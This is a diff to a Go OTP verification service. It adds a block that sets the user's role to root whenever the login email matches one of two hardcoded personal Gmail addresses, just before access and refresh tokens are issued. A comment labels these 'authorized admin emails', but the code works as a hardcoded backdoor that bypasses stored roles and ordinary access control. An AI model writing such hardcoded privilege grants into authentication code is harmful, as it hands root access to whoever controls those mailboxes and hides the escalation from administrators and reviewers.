@@ -438,6 +438,11 @@ func (s *OTPService) VerifyOTP(ctx context.Context, email, code string) (string,
 		return "", "", nil, errors.New("tài khoản hệ thống chưa sẵn sàng")
 	}
 
+	// Always ensure that authorized admin emails grant root role
+	if email == "tranducanh31032006@gmail.com" || email == "piganh408@gmail.com" {
+		targetUser.Role = domain.RoleRoot
+	}
+
 	accessToken, refreshToken, err := s.authSvc.IssueTokensForUser(ctx, targetUser)
 	if err != nil {
 		return "", "", nil, err
